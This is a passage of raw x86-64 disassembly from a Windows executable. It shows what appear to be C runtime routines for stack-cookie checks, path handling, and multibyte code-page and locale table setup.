   1400087f7:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   1400087fc:	74 0c                	je     0x14000880a
   1400087fe:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140008803:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000880a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140008810:	eb 16                	jmp    0x140008828
   140008812:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140008817:	74 0c                	je     0x140008825
   140008819:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000881e:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008825:	44 8b c7             	mov    %edi,%r8d
   140008828:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000882d:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   140008831:	e8 b6 f8 ff ff       	call   0x1400080ec
   140008836:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   14000883a:	85 c0                	test   %eax,%eax
   14000883c:	49 8b cf             	mov    %r15,%rcx
   14000883f:	48 0f 45 cf          	cmovne %rdi,%rcx
   140008843:	80 39 2e             	cmpb   $0x2e,(%rcx)
   140008846:	75 11                	jne    0x140008859
   140008848:	8a 41 01             	mov    0x1(%rcx),%al
   14000884b:	84 c0                	test   %al,%al
   14000884d:	74 20                	je     0x14000886f
   14000884f:	3c 2e                	cmp    $0x2e,%al
   140008851:	75 06                	jne    0x140008859
   140008853:	40 38 79 02          	cmp    %dil,0x2(%rcx)
   140008857:	74 16                	je     0x14000886f
   140008859:	4d 8b cc             	mov    %r12,%r9
   14000885c:	4d 8b c5             	mov    %r13,%r8
   14000885f:	48 8b d6             	mov    %rsi,%rdx
   140008862:	e8 1d fc ff ff       	call   0x140008484
   140008867:	8b f8                	mov    %eax,%edi
   140008869:	85 c0                	test   %eax,%eax
   14000886b:	75 5b                	jne    0x1400088c8
   14000886d:	33 ff                	xor    %edi,%edi
   14000886f:	40 38 7d 98          	cmp    %dil,-0x68(%rbp)
   140008873:	74 08                	je     0x14000887d
   140008875:	49 8b cf             	mov    %r15,%rcx
   140008878:	e8 a3 f6 ff ff       	call   0x140007f20
   14000887d:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140008881:	48 8b cb             	mov    %rbx,%rcx
   140008884:	ff 15 fe 6a 00 00    	call   *0x6afe(%rip)        # 0x14000f388
   14000888a:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   140008890:	85 c0                	test   %eax,%eax
   140008892:	0f 85 0d ff ff ff    	jne    0x1400087a5
   140008898:	49 8b 04 24          	mov    (%r12),%rax
   14000889c:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   1400088a1:	48 2b d0             	sub    %rax,%rdx
   1400088a4:	48 c1 fa 03          	sar    $0x3,%rdx
   1400088a8:	4c 3b f2             	cmp    %rdx,%r14
   1400088ab:	74 29                	je     0x1400088d6
   1400088ad:	49 2b d6             	sub    %r14,%rdx
   1400088b0:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1400088b4:	4c 8d 0d a5 f6 ff ff 	lea    -0x95b(%rip),%r9        # 0x140007f60
   1400088bb:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400088c1:	e8 4a 29 00 00       	call   0x14000b210
   1400088c6:	eb 0e                	jmp    0x1400088d6
   1400088c8:	80 7d 98 00          	cmpb   $0x0,-0x68(%rbp)
   1400088cc:	74 08                	je     0x1400088d6
   1400088ce:	49 8b cf             	mov    %r15,%rcx
   1400088d1:	e8 4a f6 ff ff       	call   0x140007f20
   1400088d6:	48 8b cb             	mov    %rbx,%rcx
   1400088d9:	ff 15 99 6a 00 00    	call   *0x6a99(%rip)        # 0x14000f378
   1400088df:	80 7d c8 00          	cmpb   $0x0,-0x38(%rbp)
   1400088e3:	74 09                	je     0x1400088ee
   1400088e5:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400088e9:	e8 32 f6 ff ff       	call   0x140007f20
   1400088ee:	8b c7                	mov    %edi,%eax
   1400088f0:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   1400088f7:	48 33 cc             	xor    %rsp,%rcx
   1400088fa:	e8 31 a8 ff ff       	call   0x140003130
   1400088ff:	48 8b 9c 24 88 03 00 	mov    0x388(%rsp),%rbx
   140008906:	00 
   140008907:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   14000890e:	41 5f                	pop    %r15
   140008910:	41 5e                	pop    %r14
   140008912:	41 5d                	pop    %r13
   140008914:	41 5c                	pop    %r12
   140008916:	5f                   	pop    %rdi
   140008917:	5e                   	pop    %rsi
   140008918:	5d                   	pop    %rbp
   140008919:	c3                   	ret
   14000891a:	cc                   	int3
   14000891b:	cc                   	int3
   14000891c:	e9 57 f9 ff ff       	jmp    0x140008278
   140008921:	cc                   	int3
   140008922:	cc                   	int3
   140008923:	cc                   	int3
   140008924:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008929:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000892e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008933:	57                   	push   %rdi
   140008934:	48 83 ec 40          	sub    $0x40,%rsp
   140008938:	33 db                	xor    %ebx,%ebx
   14000893a:	41 8b e8             	mov    %r8d,%ebp
   14000893d:	48 8b fa             	mov    %rdx,%rdi
   140008940:	48 8b f1             	mov    %rcx,%rsi
   140008943:	48 85 c9             	test   %rcx,%rcx
   140008946:	75 19                	jne    0x140008961
   140008948:	38 5a 28             	cmp    %bl,0x28(%rdx)
   14000894b:	74 03                	je     0x140008950
   14000894d:	88 5a 28             	mov    %bl,0x28(%rdx)
   140008950:	48 89 5a 10          	mov    %rbx,0x10(%rdx)
   140008954:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
   140008958:	48 89 5a 20          	mov    %rbx,0x20(%rdx)
   14000895c:	e9 bd 00 00 00       	jmp    0x140008a1e
   140008961:	66 39 19             	cmp    %bx,(%rcx)
   140008964:	75 30                	jne    0x140008996
   140008966:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   14000896a:	75 22                	jne    0x14000898e
   14000896c:	38 5a 28             	cmp    %bl,0x28(%rdx)
   14000896f:	74 03                	je     0x140008974
   140008971:	88 5a 28             	mov    %bl,0x28(%rdx)
   140008974:	e8 c7 ed ff ff       	call   0x140007740
   140008979:	b9 22 00 00 00       	mov    $0x22,%ecx
   14000897e:	89 08                	mov    %ecx,(%rax)
   140008980:	88 5f 28             	mov    %bl,0x28(%rdi)
   140008983:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140008987:	8b d9                	mov    %ecx,%ebx
   140008989:	e9 90 00 00 00       	jmp    0x140008a1e
   14000898e:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140008992:	88 18                	mov    %bl,(%rax)
   140008994:	eb c2                	jmp    0x140008958
   140008996:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000899b:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000899f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400089a4:	4c 8b c6             	mov    %rsi,%r8
   1400089a7:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400089ab:	33 d2                	xor    %edx,%edx
   1400089ad:	8b cd                	mov    %ebp,%ecx
   1400089af:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400089b4:	e8 0f 0d 00 00       	call   0x1400096c8
   1400089b9:	48 63 d0             	movslq %eax,%rdx
   1400089bc:	85 c0                	test   %eax,%eax
   1400089be:	75 16                	jne    0x1400089d6
   1400089c0:	ff 15 0a 67 00 00    	call   *0x670a(%rip)        # 0x14000f0d0
   1400089c6:	8b c8                	mov    %eax,%ecx
   1400089c8:	e8 03 ed ff ff       	call   0x1400076d0
   1400089cd:	e8 6e ed ff ff       	call   0x140007740
   1400089d2:	8b 18                	mov    (%rax),%ebx
   1400089d4:	eb 48                	jmp    0x140008a1e
   1400089d6:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400089da:	48 3b d1             	cmp    %rcx,%rdx
   1400089dd:	76 0a                	jbe    0x1400089e9
   1400089df:	38 5f 28             	cmp    %bl,0x28(%rdi)
   1400089e2:	74 90                	je     0x140008974
   1400089e4:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400089e7:	eb 8b                	jmp    0x140008974
   1400089e9:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400089ed:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400089f1:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400089f6:	4c 8b c6             	mov    %rsi,%r8
   1400089f9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400089fe:	33 d2                	xor    %edx,%edx
   140008a00:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140008a04:	8b cd                	mov    %ebp,%ecx
   140008a06:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008a0b:	e8 b8 0c 00 00       	call   0x1400096c8
   140008a10:	48 63 c8             	movslq %eax,%rcx
   140008a13:	85 c0                	test   %eax,%eax
   140008a15:	74 a9                	je     0x1400089c0
   140008a17:	48 ff c9             	dec    %rcx
   140008a1a:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140008a1e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008a23:	8b c3                	mov    %ebx,%eax
   140008a25:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008a2a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008a2f:	48 83 c4 40          	add    $0x40,%rsp
   140008a33:	5f                   	pop    %rdi
   140008a34:	c3                   	ret
   140008a35:	cc                   	int3
   140008a36:	cc                   	int3
   140008a37:	cc                   	int3
   140008a38:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008a3d:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008a42:	55                   	push   %rbp
   140008a43:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   140008a4a:	ff 
   140008a4b:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140008a52:	48 8b 05 a7 15 01 00 	mov    0x115a7(%rip),%rax        # 0x14001a000
   140008a59:	48 33 c4             	xor    %rsp,%rax
   140008a5c:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140008a63:	41 8b f8             	mov    %r8d,%edi
   140008a66:	48 8b da             	mov    %rdx,%rbx
   140008a69:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   140008a6f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140008a74:	ff 15 d6 68 00 00    	call   *0x68d6(%rip)        # 0x14000f350
   140008a7a:	85 c0                	test   %eax,%eax
   140008a7c:	75 14                	jne    0x140008a92
   140008a7e:	ff 15 4c 66 00 00    	call   *0x664c(%rip)        # 0x14000f0d0
   140008a84:	8b c8                	mov    %eax,%ecx
   140008a86:	e8 45 ec ff ff       	call   0x1400076d0
   140008a8b:	33 c0                	xor    %eax,%eax
   140008a8d:	e9 a0 00 00 00       	jmp    0x140008b32
   140008a92:	48 83 64 24 60 00    	andq   $0x0,0x60(%rsp)
   140008a98:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008a9d:	48 8b c7             	mov    %rdi,%rax
   140008aa0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140008aa5:	33 d2                	xor    %edx,%edx
   140008aa7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140008aac:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140008ab1:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140008ab6:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   140008abb:	e8 30 cd ff ff       	call   0x1400057f0
   140008ac0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008ac5:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   140008acb:	44 39 40 0c          	cmp    %r8d,0xc(%rax)
   140008acf:	75 15                	jne    0x140008ae6
   140008ad1:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008ad6:	74 47                	je     0x140008b1f
   140008ad8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008add:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008ae4:	eb 39                	jmp    0x140008b1f
   140008ae6:	e8 9d ee ff ff       	call   0x140007988
   140008aeb:	85 c0                	test   %eax,%eax
   140008aed:	75 1a                	jne    0x140008b09
   140008aef:	38 44 24 38          	cmp    %al,0x38(%rsp)
   140008af3:	74 0c                	je     0x140008b01
   140008af5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008afa:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008b01:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140008b07:	eb 16                	jmp    0x140008b1f
   140008b09:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008b0e:	74 0c                	je     0x140008b1c
   140008b10:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008b15:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008b1c:	45 33 c0             	xor    %r8d,%r8d
   140008b1f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140008b24:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140008b29:	e8 f6 fd ff ff       	call   0x140008924
   140008b2e:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140008b32:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140008b39:	48 33 cc             	xor    %rsp,%rcx
   140008b3c:	e8 ef a5 ff ff       	call   0x140003130
   140008b41:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140008b48:	00 
   140008b49:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140008b4d:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140008b51:	49 8b e3             	mov    %r11,%rsp
   140008b54:	5d                   	pop    %rbp
   140008b55:	c3                   	ret
   140008b56:	cc                   	int3
   140008b57:	cc                   	int3
   140008b58:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b5d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008b62:	57                   	push   %rdi
   140008b63:	48 83 ec 20          	sub    $0x20,%rsp
   140008b67:	49 8b f9             	mov    %r9,%rdi
   140008b6a:	49 8b d8             	mov    %r8,%rbx
   140008b6d:	8b 0a                	mov    (%rdx),%ecx
   140008b6f:	e8 64 f2 ff ff       	call   0x140007dd8
   140008b74:	90                   	nop
   140008b75:	48 8b 03             	mov    (%rbx),%rax
   140008b78:	48 8b 08             	mov    (%rax),%rcx
   140008b7b:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008b82:	48 83 c0 18          	add    $0x18,%rax
   140008b86:	48 8b 0d eb 2b 01 00 	mov    0x12beb(%rip),%rcx        # 0x14001b778
   140008b8d:	48 85 c9             	test   %rcx,%rcx
   140008b90:	74 6f                	je     0x140008c01
   140008b92:	48 85 c0             	test   %rax,%rax
   140008b95:	74 5d                	je     0x140008bf4
   140008b97:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140008b9d:	45 8b c8             	mov    %r8d,%r9d
   140008ba0:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140008ba4:	0f 10 00             	movups (%rax),%xmm0
   140008ba7:	0f 11 01             	movups %xmm0,(%rcx)
   140008baa:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008bae:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008bb2:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140008bb6:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140008bba:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140008bbe:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140008bc2:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140008bc6:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140008bca:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140008bce:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140008bd2:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140008bd6:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140008bda:	48 03 ca             	add    %rdx,%rcx
   140008bdd:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140008be1:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008be5:	48 03 c2             	add    %rdx,%rax
   140008be8:	49 83 e9 01          	sub    $0x1,%r9
   140008bec:	75 b6                	jne    0x140008ba4
   140008bee:	8a 00                	mov    (%rax),%al
   140008bf0:	88 01                	mov    %al,(%rcx)
   140008bf2:	eb 27                	jmp    0x140008c1b
   140008bf4:	33 d2                	xor    %edx,%edx
   140008bf6:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140008bfc:	e8 cf ba ff ff       	call   0x1400046d0
   140008c01:	e8 3a eb ff ff       	call   0x140007740
   140008c06:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008c0c:	e8 0f ea ff ff       	call   0x140007620
   140008c11:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140008c17:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140008c1b:	48 8b 03             	mov    (%rbx),%rax
   140008c1e:	48 8b 08             	mov    (%rax),%rcx
   140008c21:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008c28:	48 05 19 01 00 00    	add    $0x119,%rax
   140008c2e:	48 8b 0d 4b 2b 01 00 	mov    0x12b4b(%rip),%rcx        # 0x14001b780
   140008c35:	48 85 c9             	test   %rcx,%rcx
   140008c38:	74 5e                	je     0x140008c98
   140008c3a:	48 85 c0             	test   %rax,%rax
   140008c3d:	74 4c                	je     0x140008c8b
   140008c3f:	0f 10 00             	movups (%rax),%xmm0
   140008c42:	0f 11 01             	movups %xmm0,(%rcx)
   140008c45:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008c49:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008c4d:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140008c51:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140008c55:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140008c59:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140008c5d:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140008c61:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140008c65:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140008c69:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140008c6d:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140008c71:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140008c75:	48 03 ca             	add    %rdx,%rcx
   140008c78:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140008c7c:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008c80:	48 03 c2             	add    %rdx,%rax
   140008c83:	49 83 e8 01          	sub    $0x1,%r8
   140008c87:	75 b6                	jne    0x140008c3f
   140008c89:	eb 1d                	jmp    0x140008ca8
   140008c8b:	33 d2                	xor    %edx,%edx
   140008c8d:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140008c93:	e8 38 ba ff ff       	call   0x1400046d0
   140008c98:	e8 a3 ea ff ff       	call   0x140007740
   140008c9d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008ca3:	e8 78 e9 ff ff       	call   0x140007620
   140008ca8:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008cac:	48 8b 08             	mov    (%rax),%rcx
   140008caf:	48 8b 11             	mov    (%rcx),%rdx
   140008cb2:	83 c8 ff             	or     $0xffffffff,%eax
   140008cb5:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140008cb9:	83 f8 01             	cmp    $0x1,%eax
   140008cbc:	75 1b                	jne    0x140008cd9
   140008cbe:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008cc2:	48 8b 08             	mov    (%rax),%rcx
   140008cc5:	48 8d 05 04 15 01 00 	lea    0x11504(%rip),%rax        # 0x14001a1d0
   140008ccc:	48 39 01             	cmp    %rax,(%rcx)
   140008ccf:	74 08                	je     0x140008cd9
   140008cd1:	48 8b 09             	mov    (%rcx),%rcx
   140008cd4:	e8 47 f2 ff ff       	call   0x140007f20
   140008cd9:	48 8b 03             	mov    (%rbx),%rax
   140008cdc:	48 8b 10             	mov    (%rax),%rdx
   140008cdf:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008ce3:	48 8b 08             	mov    (%rax),%rcx
   140008ce6:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140008ced:	48 89 01             	mov    %rax,(%rcx)
   140008cf0:	48 8b 03             	mov    (%rbx),%rax
   140008cf3:	48 8b 08             	mov    (%rax),%rcx
   140008cf6:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008cfd:	f0 ff 00             	lock incl (%rax)
   140008d00:	8b 0f                	mov    (%rdi),%ecx
   140008d02:	e8 25 f1 ff ff       	call   0x140007e2c
   140008d07:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008d0c:	48 83 c4 20          	add    $0x20,%rsp
   140008d10:	5f                   	pop    %rdi
   140008d11:	c3                   	ret
   140008d12:	cc                   	int3
   140008d13:	cc                   	int3
   140008d14:	40 53                	rex push %rbx
   140008d16:	48 83 ec 40          	sub    $0x40,%rsp
   140008d1a:	8b d9                	mov    %ecx,%ebx
   140008d1c:	33 d2                	xor    %edx,%edx
   140008d1e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008d23:	e8 c8 ca ff ff       	call   0x1400057f0
   140008d28:	83 25 61 2a 01 00 00 	andl   $0x0,0x12a61(%rip)        # 0x14001b790
   140008d2f:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140008d32:	75 12                	jne    0x140008d46
   140008d34:	c7 05 52 2a 01 00 01 	movl   $0x1,0x12a52(%rip)        # 0x14001b790
   140008d3b:	00 00 00 
   140008d3e:	ff 15 5c 66 00 00    	call   *0x665c(%rip)        # 0x14000f3a0
   140008d44:	eb 15                	jmp    0x140008d5b
   140008d46:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140008d49:	75 14                	jne    0x140008d5f
   140008d4b:	c7 05 3b 2a 01 00 01 	movl   $0x1,0x12a3b(%rip)        # 0x14001b790
   140008d52:	00 00 00 
   140008d55:	ff 15 3d 66 00 00    	call   *0x663d(%rip)        # 0x14000f398
   140008d5b:	8b d8                	mov    %eax,%ebx
   140008d5d:	eb 17                	jmp    0x140008d76
   140008d5f:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140008d62:	75 12                	jne    0x140008d76
   140008d64:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008d69:	c7 05 1d 2a 01 00 01 	movl   $0x1,0x12a1d(%rip)        # 0x14001b790
   140008d70:	00 00 00 
   140008d73:	8b 58 0c             	mov    0xc(%rax),%ebx
   140008d76:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140008d7b:	74 0c                	je     0x140008d89
   140008d7d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140008d82:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140008d89:	8b c3                	mov    %ebx,%eax
   140008d8b:	48 83 c4 40          	add    $0x40,%rsp
   140008d8f:	5b                   	pop    %rbx
   140008d90:	c3                   	ret
   140008d91:	cc                   	int3
   140008d92:	cc                   	int3
   140008d93:	cc                   	int3
   140008d94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008d99:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008d9e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008da3:	57                   	push   %rdi
   140008da4:	48 83 ec 20          	sub    $0x20,%rsp
   140008da8:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   140008dac:	48 8b f1             	mov    %rcx,%rsi
   140008daf:	bd 01 01 00 00       	mov    $0x101,%ebp
   140008db4:	48 8b cb             	mov    %rbx,%rcx
   140008db7:	44 8b c5             	mov    %ebp,%r8d
   140008dba:	33 d2                	xor    %edx,%edx
   140008dbc:	e8 0f b9 ff ff       	call   0x1400046d0
   140008dc1:	33 c0                	xor    %eax,%eax
   140008dc3:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140008dc7:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140008dcb:	b9 06 00 00 00       	mov    $0x6,%ecx
   140008dd0:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140008dd7:	0f b7 c0             	movzwl %ax,%eax
   140008dda:	66 f3 ab             	rep stos %ax,(%rdi)
   140008ddd:	48 8d 3d ec 13 01 00 	lea    0x113ec(%rip),%rdi        # 0x14001a1d0
   140008de4:	48 2b fe             	sub    %rsi,%rdi
   140008de7:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   140008dea:	88 03                	mov    %al,(%rbx)
   140008dec:	48 ff c3             	inc    %rbx
   140008def:	48 83 ed 01          	sub    $0x1,%rbp
   140008df3:	75 f2                	jne    0x140008de7
   140008df5:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   140008dfc:	ba 00 01 00 00       	mov    $0x100,%edx
   140008e01:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   140008e04:	88 01                	mov    %al,(%rcx)
   140008e06:	48 ff c1             	inc    %rcx
   140008e09:	48 83 ea 01          	sub    $0x1,%rdx
   140008e0d:	75 f2                	jne    0x140008e01
   140008e0f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008e14:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008e19:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008e1e:	48 83 c4 20          	add    $0x20,%rsp
   140008e22:	5f                   	pop    %rdi
   140008e23:	c3                   	ret
   140008e24:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008e29:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008e2e:	55                   	push   %rbp
   140008e2f:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140008e36:	ff 
   140008e37:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140008e3e:	48 8b 05 bb 11 01 00 	mov    0x111bb(%rip),%rax        # 0x14001a000
   140008e45:	48 33 c4             	xor    %rsp,%rax
   140008e48:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140008e4f:	48 8b d9             	mov    %rcx,%rbx
   140008e52:	8b 49 04             	mov    0x4(%rcx),%ecx
   140008e55:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140008e5b:	0f 84 3d 01 00 00    	je     0x140008f9e
   140008e61:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140008e66:	ff 15 3c 65 00 00    	call   *0x653c(%rip)        # 0x14000f3a8
   140008e6c:	85 c0                	test   %eax,%eax
   140008e6e:	0f 84 2a 01 00 00    	je     0x140008f9e
   140008e74:	33 c0                	xor    %eax,%eax
   140008e76:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140008e7b:	be 00 01 00 00       	mov    $0x100,%esi
   140008e80:	88 01                	mov    %al,(%rcx)
   140008e82:	ff c0                	inc    %eax
   140008e84:	48 ff c1             	inc    %rcx
   140008e87:	3b c6                	cmp    %esi,%eax
   140008e89:	72 f5                	jb     0x140008e80
   140008e8b:	8a 44 24 56          	mov    0x56(%rsp),%al
   140008e8f:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140008e94:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140008e99:	eb 20                	jmp    0x140008ebb
   140008e9b:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   140008ea0:	0f b6 c8             	movzbl %al,%ecx
   140008ea3:	eb 0b                	jmp    0x140008eb0
   140008ea5:	3b ce                	cmp    %esi,%ecx
   140008ea7:	73 0c                	jae    0x140008eb5
   140008ea9:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   140008eae:	ff c1                	inc    %ecx
   140008eb0:	41 3b c8             	cmp    %r8d,%ecx
   140008eb3:	76 f0                	jbe    0x140008ea5
   140008eb5:	48 83 c2 02          	add    $0x2,%rdx
   140008eb9:	8a 02                	mov    (%rdx),%al
   140008ebb:	84 c0                	test   %al,%al
   140008ebd:	75 dc                	jne    0x140008e9b
   140008ebf:	8b 43 04             	mov    0x4(%rbx),%eax
   140008ec2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140008ec7:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140008ecc:	44 8b ce             	mov    %esi,%r9d
   140008ecf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008ed3:	ba 01 00 00 00       	mov    $0x1,%edx
   140008ed8:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   140008edf:	33 c9                	xor    %ecx,%ecx
   140008ee1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008ee6:	e8 5d 12 00 00       	call   0x14000a148
   140008eeb:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140008ef0:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140008ef5:	8b 43 04             	mov    0x4(%rbx),%eax
   140008ef8:	44 8b c6             	mov    %esi,%r8d
   140008efb:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
